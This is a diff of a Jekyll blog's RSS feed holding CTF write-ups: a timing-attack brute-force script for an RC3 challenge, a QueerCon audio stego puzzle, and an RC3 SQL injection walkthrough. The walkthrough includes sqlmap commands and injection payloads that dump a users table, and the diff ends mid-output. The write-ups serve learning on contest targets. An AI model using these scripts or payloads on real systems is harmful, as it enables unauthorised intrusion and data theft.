@@ -5,9 +5,9 @@
     <description>This is the jekyllTheme example blog. It only exists to demonstrate how the theme looks and feels.</description>
     <link>/</link>
     <atom:link href="/feed.xml" rel="self" type="application/rss+xml"/>
-      <pubDate>Mon, 21 Nov 2016 13:39:31 -0800</pubDate>
-    <lastBuildDate>Mon, 21 Nov 2016 13:39:31 -0800</lastBuildDate>
-    <generator>Jekyll v3.1.6</generator>
+      <pubDate>Tue, 29 May 2018 22:29:55 -0500</pubDate>
+    <lastBuildDate>Tue, 29 May 2018 22:29:55 -0500</lastBuildDate>
+    <generator>Jekyll v3.7.3</generator>
     
       <item>
         <title>RC3 2016 ~ Goodtime: Misc 150</title>
@@ -21,7 +21,7 @@ The flag is not on the youtube video, the flag on there is someone trying to con
 The flag is also longer than normal.
 https://www.youtube.com/watch?v=H7HmzwI67ec
 nc goodtime.ctf.rc3.club 5866
-NOTE: there should be a prompt when you connect. if there isn&#39;t it went down so scream at me in IRC until I fix.
+NOTE: there should be a prompt when you connect. if there isn't it went down so scream at me in IRC until I fix.
 
 author: wumb0
 &lt;/code&gt;&lt;/pre&gt;
@@ -50,7 +50,7 @@ import socket
 import re
 import sys
 
-timer = time.clock if sys.platform == &#39;win32&#39; else time.time
+timer = time.clock if sys.platform == 'win32' else time.time
 
 #host to connect to
 host=&quot;54.167.134.245&quot;
@@ -75,7 +75,7 @@ data2 = s.recv(1024)
 print data2
 print &quot;Attempting: &quot; + attempt
 #Send out flag
-s.send(attempt + &#39;\n&#39;)
+s.send(attempt + '\n')
 #Read response
 data2 = s.recv(1024)
 #end timer
@@ -125,7 +125,7 @@ import socket
 import re
 import sys
 
-timer = time.clock if sys.platform == &#39;win32&#39; else time.time
+timer = time.clock if sys.platform == 'win32' else time.time
 
 host=&quot;54.167.134.245&quot;
 #the port with whatever u want 
@@ -155,13 +155,13 @@ for x in range(0,50):
 		print data2
 		#Send flag
 		print &quot;Attempting: &quot; + attempt
-		s.send(attempt + &#39;\n&#39;)
+		s.send(attempt + '\n')
 		#keep this to get the actual response
 		data2 = s.recv(1024)
 		#End timer
 		time1 = timer()-start
 		print &quot;Time 1: &quot; + str(time1)
-		# print &#39;time taken &#39;, timer()-start ,&#39; seconds&#39;
+		# print 'time taken ', timer()-start ,' seconds'
 		if (timer()-start &amp;gt; highestTime):
 			highestTime = timer()-start
 			highestChar = x
@@ -171,12 +171,12 @@ for x in range(0,50):
 		start = timer()
 		s.connect((host, port))
 		data2 = s.recv(1024)
-		s.send(attempt + &#39;\n&#39;)
+		s.send(attempt + '\n')
 		#keep this to get the actual response
 		data2 = s.recv(1024)
 		time2 = timer()-start
 		print &quot;Time 2: &quot; + str(time2)
-		# print &#39;time taken &#39;, timer()-start ,&#39; seconds&#39;
+		# print 'time taken ', timer()-start ,' seconds'
 		average = (time1+time2)/2
 		print &quot;Average: &quot; + str(average)
 		if (average &amp;gt; highestTime):
@@ -210,7 +210,7 @@ for x in range(0,50):
 
 &lt;p&gt;The hardest part was due to inconsistency in the netcat connection. Any new characters I received from my script, I had to triple check manually. 9/10 it was just a false positive due to the netcat connection. It might’ve been better if I was connected with a wired connection rather than WIFI. Luckily, it wasn’t so bad to guess some of the flag. When I saw the words &lt;strong&gt;itz-al&lt;/strong&gt;, I already knew it was a Carly Rae reference - “It’s always a good time”. I manually input every version of &lt;strong&gt;always&lt;/strong&gt; like &lt;strong&gt;alw4ys&lt;/strong&gt; and &lt;strong&gt;alw@ys&lt;/strong&gt; - one character at a time. Whenever the response time went up - I knew that was the correct character. The most trickiest part was after &lt;strong&gt;g00d-t1m&lt;/strong&gt;. I thought I was done because I assumed the flag was &lt;strong&gt;itz alwayz a good time&lt;/strong&gt;. I had to bruteforce the second &lt;strong&gt;1&lt;/strong&gt; for &lt;strong&gt;t1m1ng&lt;/strong&gt;. I had no clue why it was a &lt;strong&gt;1&lt;/strong&gt; at the time only to realize an hour later it was &lt;strong&gt;timing&lt;/strong&gt; and not &lt;strong&gt;time&lt;/strong&gt;. Additionally, the last part of the flag - &lt;strong&gt;@tt@ck&lt;/strong&gt; -  threw me off because I assumed the last word in the flag would be alphanumeric. The last word took me atleast 3 hours because the server kept crashing and each flag I input had a response time of atleast 10 seconds. To brute force the &lt;strong&gt;@&lt;/strong&gt; it required all lowercase, uppercase, numbers, and punctuations - 10 seconds a piece. About 10 minutes if I was lucky the server didn’t crash. At last though I was able to get the flag.&lt;/p&gt;
 </description>
-        <pubDate>Sun, 20 Nov 2016 03:29:33 -0800</pubDate>
+        <pubDate>Sun, 20 Nov 2016 05:29:33 -0600</pubDate>
         <link>/blog/ctf/misc/all/goodtime</link>
         <guid isPermaLink="true">/blog/ctf/misc/all/goodtime</guid>
         
@@ -259,7 +259,7 @@ Give up? Stay tuned for clues! They will be posted around in various places; suc
 
 &lt;p&gt;I turned on the song for the next four hours while solving this puzzle to make sure it got stuck in my head.&lt;/p&gt;
 
-&lt;p&gt;Like any stego expert I downloaded the &lt;a href=&quot;https://viviturtle.github.io/assets/queercon/Crypto [QueerCon13].mp3&quot;&gt;full song&lt;/a&gt; from SoundCloud and looked at its metadata using exiftool which I saved &lt;a href=&quot;https://viviturtle.github.io/assets/queercon/Metadata.txt&quot;&gt;here&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Like any stego expert I downloaded the &lt;a href=&quot;http://localhost:4000/assets/queercon/Crypto [QueerCon13].mp3&quot;&gt;full song&lt;/a&gt; from SoundCloud and looked at its metadata using exiftool which I saved &lt;a href=&quot;http://localhost:4000/assets/queercon/Metadata.txt&quot;&gt;here&lt;/a&gt;&lt;/p&gt;
 
 &lt;figure&gt;
 &lt;script type=&quot;text/javascript&quot; src=&quot;https://asciinema.org/a/82493.js&quot; id=&quot;asciicast-82493&quot; async=&quot;&quot;&gt;&lt;/script&gt;
@@ -306,23 +306,23 @@ Give up? Stay tuned for clues! They will be posted around in various places; suc
 
 &lt;div class=&quot;album&quot;&gt;
    &lt;figure&gt;
-      &lt;img src=&quot;https://viviturtle.github.io/images/queercon/spectrogram-1-1.png&quot; /&gt;
+      &lt;img src=&quot;http://localhost:4000/images/queercon/spectrogram-1-1.png&quot; /&gt;
       &lt;figcaption&gt;spectrogram-1-1.png&lt;/figcaption&gt;
    &lt;/figure&gt;
    &lt;figure&gt;
-      &lt;img src=&quot;https://viviturtle.github.io/images/queercon/spectrogram-10-5.png&quot; /&gt;
+      &lt;img src=&quot;http://localhost:4000/images/queercon/spectrogram-10-5.png&quot; /&gt;
       &lt;figcaption&gt;spectrogram-10-5.png&lt;/figcaption&gt;
    &lt;/figure&gt;
     &lt;figure&gt;
-      &lt;img src=&quot;https://viviturtle.github.io/images/queercon/spectrogram-65-5.png&quot; /&gt;
+      &lt;img src=&quot;http://localhost:4000/images/queercon/spectrogram-65-5.png&quot; /&gt;
       &lt;figcaption&gt;spectrogram-65-5.png&lt;/figcaption&gt;
    &lt;/figure&gt;   
    &lt;figure&gt;
-      &lt;img src=&quot;https://viviturtle.github.io/images/queercon/spectrogram-110-5.png&quot; /&gt;
+      &lt;img src=&quot;http://localhost:4000/images/queercon/spectrogram-110-5.png&quot; /&gt;
       &lt;figcaption&gt;spectrogram-110-5.png&lt;/figcaption&gt;
    &lt;/figure&gt;   
    &lt;figure&gt;
-      &lt;img src=&quot;https://viviturtle.github.io/images/queercon/spectrogram-169-5.png&quot; /&gt;
+      &lt;img src=&quot;http://localhost:4000/images/queercon/spectrogram-169-5.png&quot; /&gt;
       &lt;figcaption&gt;spectrogram-169-5.png&lt;/figcaption&gt;
    &lt;/figure&gt;
 &lt;/div&gt;
@@ -331,23 +331,23 @@ Give up? Stay tuned for clues! They will be posted around in various places; suc
 
 &lt;div class=&quot;album&quot;&gt;
    &lt;figure&gt;
-      &lt;img src=&quot;https://viviturtle.github.io/images/queercon/sonic1.png&quot; /&gt;
+      &lt;img src=&quot;http://localhost:4000/images/queercon/sonic1.png&quot; /&gt;
       &lt;figcaption&gt;sonic1.png&lt;/figcaption&gt;
    &lt;/figure&gt;
    &lt;figure&gt;
-      &lt;img src=&quot;https://viviturtle.github.io/images/queercon/sonic2.png&quot; /&gt;
+      &lt;img src=&quot;http://localhost:4000/images/queercon/sonic2.png&quot; /&gt;
       &lt;figcaption&gt;sonic2.png&lt;/figcaption&gt;
    &lt;/figure&gt;
     &lt;figure&gt;
-      &lt;img src=&quot;https://viviturtle.github.io/images/queercon/sonic3.png&quot; /&gt;
+      &lt;img src=&quot;http://localhost:4000/images/queercon/sonic3.png&quot; /&gt;
       &lt;figcaption&gt;sonic3.png&lt;/figcaption&gt;
    &lt;/figure&gt;   
    &lt;figure&gt;
-      &lt;img src=&quot;https://viviturtle.github.io/images/queercon/sonic4.png&quot; /&gt;
+      &lt;img src=&quot;http://localhost:4000/images/queercon/sonic4.png&quot; /&gt;
       &lt;figcaption&gt;sonic4.png&lt;/figcaption&gt;
    &lt;/figure&gt;   
    &lt;figure&gt;
-      &lt;img src=&quot;https://viviturtle.github.io/images/queercon/sonic5.png&quot; /&gt;
+      &lt;img src=&quot;http://localhost:4000/images/queercon/sonic5.png&quot; /&gt;
       &lt;figcaption&gt;sonic5.png&lt;/figcaption&gt;
    &lt;/figure&gt;
 &lt;/div&gt;
@@ -386,7 +386,7 @@ Give up? Stay tuned for clues! They will be posted around in various places; suc
 
 &lt;p&gt;If you want a review of this year’s badge feel free to head to &lt;a href=&quot;http://hackaday.com/2016/08/10/what-we-learned-from-the-2016-queercon-badge/&quot;&gt;http://hackaday.com/2016/08/10/what-we-learned-from-the-2016-queercon-badge/&lt;/a&gt; Thanks again QueerCon for the awesome and fun challenge&lt;/p&gt;
 </description>
-        <pubDate>Thu, 11 Aug 2016 04:29:33 -0700</pubDate>
+        <pubDate>Thu, 11 Aug 2016 06:29:33 -0500</pubDate>
         <link>/blog/ctf/stego/crypto/all/QC13-Soundcheck</link>
         <guid isPermaLink="true">/blog/ctf/stego/crypto/all/QC13-Soundcheck</guid>
         
@@ -409,34 +409,34 @@ Give up? Stay tuned for clues! They will be posted around in various places; suc
     
       <item>
         <title>RC3 2015 ~ Top Secret: Web 400</title>
-        <description>&lt;p&gt;&lt;a href=&quot;https://viviturtle.github.io/images/rc3/TopSecret/start.png&quot;&gt;&lt;img src=&quot;https://viviturtle.github.io/images/rc3/TopSecret/start.png&quot; alt=&quot;start&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+        <description>&lt;p&gt;&lt;a href=&quot;http://localhost:4000/images/rc3/TopSecret/start.png&quot;&gt;&lt;img src=&quot;http://localhost:4000/images/rc3/TopSecret/start.png&quot; alt=&quot;start&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;This was a pretty fun Web CTF question. In short summary this question was a SQL Injection exploit that used cookies and post methods. Most people that know how to do basic SQL injections, will only know how to do it from the URL (GET Method). This one used POST. Luckily I knew how to do POST SQLi from my curiosity when I first learned it, and luckily I had pre-installed CO2 Burp extension for a previous competition, which made the SQL injection exploit very simple.&lt;/p&gt;
 
 &lt;p&gt;We given a link &lt;a href=&quot;http://162.243.171.85/&quot;&gt;http://162.243.171.85/&lt;/a&gt;. Upon visting the site we see a simple login.&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://viviturtle.github.io/images/rc3/TopSecret/start_web.png&quot;&gt;&lt;img src=&quot;https://viviturtle.github.io/images/rc3/TopSecret/start_web.png&quot; alt=&quot;start_web&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;http://localhost:4000/images/rc3/TopSecret/start_web.png&quot;&gt;&lt;img src=&quot;http://localhost:4000/images/rc3/TopSecret/start_web.png&quot; alt=&quot;start_web&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;First thing you do for any Web Application Penetration Test is Recon and mapping. So I opened up Burp to record all my page visits, and used the web application normally. I registered for an account and looked at the default web page.&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://viviturtle.github.io/images/rc3/TopSecret/Default_web.png&quot;&gt;&lt;img src=&quot;https://viviturtle.github.io/images/rc3/TopSecret/Default_web.png&quot; alt=&quot;Default_web&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;http://localhost:4000/images/rc3/TopSecret/Default_web.png&quot;&gt;&lt;img src=&quot;http://localhost:4000/images/rc3/TopSecret/Default_web.png&quot; alt=&quot;Default_web&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;We can clearly see three other pages. Home, Find Friends, and Logout. I tried a few of the pages.&lt;/p&gt;
 
 &lt;figure&gt;
-   &lt;img src=&quot;https://viviturtle.github.io/images/rc3/TopSecret/home.png&quot; /&gt;
+   &lt;img src=&quot;http://localhost:4000/images/rc3/TopSecret/home.png&quot; /&gt;
    &lt;figcaption&gt;Home &lt;/figcaption&gt;
 &lt;/figure&gt;
 
 &lt;figure&gt;
-   &lt;img src=&quot;https://viviturtle.github.io/images/rc3/TopSecret/friends.png&quot; /&gt;
+   &lt;img src=&quot;http://localhost:4000/images/rc3/TopSecret/friends.png&quot; /&gt;
    &lt;figcaption&gt;Find Friends &lt;/figcaption&gt;
 &lt;/figure&gt;
 
 &lt;p&gt;The home page involves typing in some secret to store and displays it in a table. The Friends page shows other users. Trying to put it together, we need to find some way to get another person’s secret using the two pages. In other words, we need to find the admin’s secrets. After figuring this out, I tried to look at the actual requests.&lt;/p&gt;
 
 &lt;figure&gt;
-   &lt;img src=&quot;https://viviturtle.github.io/images/rc3/TopSecret/burp_friends.png&quot; /&gt;
+   &lt;img src=&quot;http://localhost:4000/images/rc3/TopSecret/burp_friends.png&quot; /&gt;
    &lt;figcaption&gt;Friends Request&lt;/figcaption&gt;
 &lt;/figure&gt;
 
@@ -456,7 +456,7 @@ username=admin
 &lt;/code&gt;&lt;/pre&gt;
 
 &lt;figure&gt;
-   &lt;img src=&quot;https://viviturtle.github.io/images/rc3/TopSecret/burp_home.png&quot; /&gt;
+   &lt;img src=&quot;http://localhost:4000/images/rc3/TopSecret/burp_home.png&quot; /&gt;
    &lt;figcaption&gt;Home Request&lt;/figcaption&gt;
 &lt;/figure&gt;
 
@@ -477,54 +477,54 @@ secret=apple
 
 &lt;p&gt;The only thing we should take note of, is that both of these pages use &lt;strong&gt;POST&lt;/strong&gt; methods to retrieve data, where “secret” and “username” are the pieces of data being sent. We can also see there is a &lt;strong&gt;PHPSESSID&lt;/strong&gt; to record the current user. Now let’s try some exploitation. First thing I tried was SQL injection. Let’s try escaping the SQL query using a &lt;strong&gt;‘&lt;/strong&gt; character.&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://viviturtle.github.io/images/rc3/TopSecret/sqli.png&quot;&gt;&lt;img src=&quot;https://viviturtle.github.io/images/rc3/TopSecret/sqli.png&quot; alt=&quot;sqli&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;http://localhost:4000/images/rc3/TopSecret/sqli.png&quot;&gt;&lt;img src=&quot;http://localhost:4000/images/rc3/TopSecret/sqli.png&quot; alt=&quot;sqli&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;This proves the Friends page is vulnerable to &lt;strong&gt;SQL injection&lt;/strong&gt;. I right clicked on the request in Burp: Right Click &amp;gt; Send to SQLMapper (a free Burp Extension by the CO2 Suite) and copied the SqlMap command. You will notice a data section for post parameters and a cookie value.&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://viviturtle.github.io/images/rc3/TopSecret/sqlmapper.png&quot;&gt;&lt;img src=&quot;https://viviturtle.github.io/images/rc3/TopSecret/sqlmapper.png&quot; alt=&quot;sqlmapper&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;http://localhost:4000/images/rc3/TopSecret/sqlmapper.png&quot;&gt;&lt;img src=&quot;http://localhost:4000/images/rc3/TopSecret/sqlmapper.png&quot; alt=&quot;sqlmapper&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
-&lt;pre&gt;&lt;code&gt;sqlmap -u &#39;http://162.243.171.85:80/find.php&#39; --data=&#39;username=admin&#39; --cookie=&#39;PHPSESSID=982677f8035354b556b6d80b00353187b77a997cd28e49bfda777e5c91f80dafc61114c392a70b95bd4fe12ddb727ab9f9d19032a8a21f393517af1635d24f9d&#39;
+&lt;pre&gt;&lt;code&gt;sqlmap -u 'http://162.243.171.85:80/find.php' --data='username=admin' --cookie='PHPSESSID=982677f8035354b556b6d80b00353187b77a997cd28e49bfda777e5c91f80dafc61114c392a70b95bd4fe12ddb727ab9f9d19032a8a21f393517af1635d24f9d'
 &lt;/code&gt;&lt;/pre&gt;
 
 &lt;p&gt;Now to try the exploit.&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://viviturtle.github.io/images/rc3/TopSecret/dbs.png&quot;&gt;&lt;img src=&quot;https://viviturtle.github.io/images/rc3/TopSecret/dbs.png&quot; alt=&quot;dbs&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;http://localhost:4000/images/rc3/TopSecret/dbs.png&quot;&gt;&lt;img src=&quot;http://localhost:4000/images/rc3/TopSecret/dbs.png&quot; alt=&quot;dbs&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;As you can see the application is clearly vulnerable and it works with SQLMap. If you don’t know what SQLmap it’s pretty much an automated tool to do SQL injectons. First I tested for database names (–dbs flag).&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://viviturtle.github.io/assets/rc3/TopSecret/dbs_output.txt&quot;&gt;dbs_output.txt&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;http://localhost:4000/assets/rc3/TopSecret/dbs_output.txt&quot;&gt;dbs_output.txt&lt;/a&gt;&lt;/p&gt;
 
-&lt;pre&gt;&lt;code&gt;viviturtle@vivi-laptop:~$ sqlmap -u &#39;http://162.243.171.85:80/find.php&#39; --data=&#39;username=admin&#39; --cookie=&#39;PHPSESSID=982677f8035354b556b6d80b00353187b77a997cd28e49bfda777e5c91f80dafc61114c392a70b95bd4fe12ddb727ab9f9d19032a8a21f393517af1635d24f9d&#39; -p username --dbs
+&lt;pre&gt;&lt;code&gt;viviturtle@vivi-laptop:~$ sqlmap -u 'http://162.243.171.85:80/find.php' --data='username=admin' --cookie='PHPSESSID=982677f8035354b556b6d80b00353187b77a997cd28e49bfda777e5c91f80dafc61114c392a70b95bd4fe12ddb727ab9f9d19032a8a21f393517af1635d24f9d' -p username --dbs
          _
  ___ ___| |_____ ___ ___  {1.0-dev-nongit-20150919}
-|_ -| . | |     | .&#39;| . |
+|_ -| . | |     | .'| . |
 |___|_  |_|_|_|_|__,|  _|
       |_|           |_|   http://sqlmap.org
 
-[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
 
 [*] starting at 18:37:55
 
-[18:37:55] [INFO] resuming back-end DBMS &#39;mysql&#39; 
+[18:37:55] [INFO] resuming back-end DBMS 'mysql' 
 [18:37:55] [INFO] testing connection to the target URL
 sqlmap resumed the following injection point(s) from stored session:
 ---
 Parameter: username (POST)
     Type: boolean-based blind
     Title: AND boolean-based blind - WHERE or HAVING clause
-    Payload: username=test&#39; AND 7074=7074 AND &#39;UonP&#39;=&#39;UonP
+    Payload: username=test' AND 7074=7074 AND 'UonP'='UonP
 
     Type: error-based
     Title: MySQL &amp;gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause
-    Payload: username=test&#39; AND (SELECT 7296 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(7296=7296,1))),0x7176627071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND &#39;DRrf&#39;=&#39;DRrf
+    Payload: username=test' AND (SELECT 7296 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(7296=7296,1))),0x7176627071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'DRrf'='DRrf
 
     Type: AND/OR time-based blind
     Title: MySQL &amp;gt;= 5.0.12 AND time-based blind (SELECT)
-    Payload: username=test&#39; AND (SELECT * FROM (SELECT(SLEEP(5)))XSaB) AND &#39;wzNJ&#39;=&#39;wzNJ
+    Payload: username=test' AND (SELECT * FROM (SELECT(SLEEP(5)))XSaB) AND 'wzNJ'='wzNJ
 
     Type: UNION query
     Title: Generic UNION query (NULL) - 2 columns
-    Payload: username=test&#39; UNION ALL SELECT CONCAT(0x71717a6271,0x4f72664d694671504f4f,0x7176627071),NULL-- 
+    Payload: username=test' UNION ALL SELECT CONCAT(0x71717a6271,0x4f72664d694671504f4f,0x7176627071),NULL-- 
 ---
 [18:37:56] [INFO] the back-end DBMS is MySQL
 web server operating system: Linux Ubuntu
@@ -535,7 +535,7 @@ available databases [2]:
 [*] information_schema
 [*] TopSecret
 
-[18:37:56] [INFO] fetched data logged to text files under &#39;/home/viviturtle/.sqlmap/output/162.243.171.85&#39;
+[18:37:56] [INFO] fetched data logged to text files under '/home/viviturtle/.sqlmap/output/162.243.171.85'
 
 [*] shutting down at 18:37:56
 
@@ -543,52 +543,52 @@ available databases [2]:
 
 &lt;p&gt;It gave us the default database, information_schema and one other, TopSecret. Using the Top Secret Database, I tried to see what tables were in there; -D TopSecret –tables (-D to choose DB and –tables to find tables).&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://viviturtle.github.io/assets/rc3/TopSecret/table_output.txt&quot;&gt;table_output.txt&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;http://localhost:4000/assets/rc3/TopSecret/table_output.txt&quot;&gt;table_output.txt&lt;/a&gt;&lt;/p&gt;
 
-&lt;pre&gt;&lt;code&gt;viviturtle@vivi-laptop:~$ sqlmap -u &#39;http://162.243.171.85:80/find.php&#39; --data=&#39;username=admin&#39; --cookie=&#39;PHPSESSID=982677f8035354b556b6d80b00353187b77a997cd28e49bfda777e5c91f80dafc61114c392a70b95bd4fe12ddb727ab9f9d19032a8a21f393517af1635d24f9d&#39; -p username -D TopSecret --tables
+&lt;pre&gt;&lt;code&gt;viviturtle@vivi-laptop:~$ sqlmap -u 'http://162.243.171.85:80/find.php' --data='username=admin' --cookie='PHPSESSID=982677f8035354b556b6d80b00353187b77a997cd28e49bfda777e5c91f80dafc61114c392a70b95bd4fe12ddb727ab9f9d19032a8a21f393517af1635d24f9d' -p username -D TopSecret --tables
          _
  ___ ___| |_____ ___ ___  {1.0-dev-nongit-20150919}
-|_ -| . | |     | .&#39;| . |
+|_ -| . | |     | .'| . |
 |___|_  |_|_|_|_|__,|  _|
       |_|           |_|   http://sqlmap.org
 
-[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
 
 [*] starting at 18:38:35
 
-[18:38:35] [INFO] resuming back-end DBMS &#39;mysql&#39; 
+[18:38:35] [INFO] resuming back-end DBMS 'mysql' 
 [18:38:35] [INFO] testing connection to the target URL
 sqlmap resumed the following injection point(s) from stored session:
 ---
 Parameter: username (POST)
     Type: boolean-based blind
     Title: AND boolean-based blind - WHERE or HAVING clause
-    Payload: username=test&#39; AND 7074=7074 AND &#39;UonP&#39;=&#39;UonP
+    Payload: username=test' AND 7074=7074 AND 'UonP'='UonP
 
     Type: error-based
     Title: MySQL &amp;gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause
-    Payload: username=test&#39; AND (SELECT 7296 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(7296=7296,1))),0x7176627071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND &#39;DRrf&#39;=&#39;DRrf
+    Payload: username=test' AND (SELECT 7296 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(7296=7296,1))),0x7176627071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'DRrf'='DRrf
 
     Type: AND/OR time-based blind
     Title: MySQL &amp;gt;= 5.0.12 AND time-based blind (SELECT)
-    Payload: username=test&#39; AND (SELECT * FROM (SELECT(SLEEP(5)))XSaB) AND &#39;wzNJ&#39;=&#39;wzNJ
+    Payload: username=test' AND (SELECT * FROM (SELECT(SLEEP(5)))XSaB) AND 'wzNJ'='wzNJ
 
     Type: UNION query
     Title: Generic UNION query (NULL) - 2 columns
-    Payload: username=test&#39; UNION ALL SELECT CONCAT(0x71717a6271,0x4f72664d694671504f4f,0x7176627071),NULL-- 
+    Payload: username=test' UNION ALL SELECT CONCAT(0x71717a6271,0x4f72664d694671504f4f,0x7176627071),NULL-- 
 ---
 [18:38:35] [INFO] the back-end DBMS is MySQL
 web server operating system: Linux Ubuntu
 web application technology: Apache 2.4.7, PHP 5.5.9
 back-end DBMS: MySQL 5.0
-[18:38:35] [INFO] fetching tables for database: &#39;TopSecret&#39;
+[18:38:35] [INFO] fetching tables for database: 'TopSecret'
 Database: TopSecret
 [1 table]
 +-------+
 | users |
 +-------+
 
-[18:38:35] [INFO] fetched data logged to text files under &#39;/home/viviturtle/.sqlmap/output/162.243.171.85&#39;
+[18:38:35] [INFO] fetched data logged to text files under '/home/viviturtle/.sqlmap/output/162.243.171.85'
 
 [*] shutting down at 18:38:35
 
@@ -596,46 +596,46 @@ Database: TopSecret
 
 &lt;p&gt;It had one table, users. Let’s dump this table:  -D TopSecret -T users –dump(-D to choose DB, -T to choose table and –dump to dump the table).&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://viviturtle.github.io/assets/rc3/TopSecret/dump.txt&quot;&gt;dump.txt&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;http://localhost:4000/assets/rc3/TopSecret/dump.txt&quot;&gt;dump.txt&lt;/a&gt;&lt;/p&gt;
 
-&lt;pre&gt;&lt;code&gt;viviturtle@vivi-laptop:~$ sqlmap -u &#39;http://162.243.171.85:80/find.php&#39; --data=&#39;username=admin&#39; --cookie=&#39;PHPSESSID=982677f8035354b556b6d80b00353187b77a997cd28e49bfda777e5c91f80dafc61114c392a70b95bd4fe12ddb727ab9f9d19032a8a21f393517af1635d24f9d&#39; -p username -D TopSecret -T users --dump
+&lt;pre&gt;&lt;code&gt;viviturtle@vivi-laptop:~$ sqlmap -u 'http://162.243.171.85:80/find.php' --data='username=admin' --cookie='PHPSESSID=982677f8035354b556b6d80b00353187b77a997cd28e49bfda777e5c91f80dafc61114c392a70b95bd4fe12ddb727ab9f9d19032a8a21f393517af1635d24f9d' -p username -D TopSecret -T users --dump
          _
  ___ ___| |_____ ___ ___  {1.0-dev-nongit-20150919}
-|_ -| . | |     | .&#39;| . |
+|_ -| . | |     | .'| . |
 |___|_  |_|_|_|_|__,|  _|
       |_|           |_|   http://sqlmap.org
 
-[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
 
 [*] starting at 18:39:00
 
-[18:39:01] [INFO] resuming back-end DBMS &#39;mysql&#39; 
+[18:39:01] [INFO] resuming back-end DBMS 'mysql' 
 [18:39:01] [INFO] testing connection to the target URL
 sqlmap resumed the following injection point(s) from stored session:
 ---
 Parameter: username (POST)
     Type: boolean-based blind
     Title: AND boolean-based blind - WHERE or HAVING clause
-    Payload: username=test&#39; AND 7074=7074 AND &#39;UonP&#39;=&#39;UonP
+    Payload: username=test' AND 7074=7074 AND 'UonP'='UonP
 
     Type: error-based
     Title: MySQL &amp;gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause
-    Payload: username=test&#39; AND (SELECT 7296 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(7296=7296,1))),0x7176627071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND &#39;DRrf&#39;=&#39;DRrf
+    Payload: username=test' AND (SELECT 7296 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(7296=7296,1))),0x7176627071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'DRrf'='DRrf
 
     Type: AND/OR time-based blind
     Title: MySQL &amp;gt;= 5.0.12 AND time-based blind (SELECT)
-    Payload: username=test&#39; AND (SELECT * FROM (SELECT(SLEEP(5)))XSaB) AND &#39;wzNJ&#39;=&#39;wzNJ
+    Payload: username=test' AND (SELECT * FROM (SELECT(SLEEP(5)))XSaB) AND 'wzNJ'='wzNJ
 
     Type: UNION query
     Title: Generic UNION query (NULL) - 2 columns
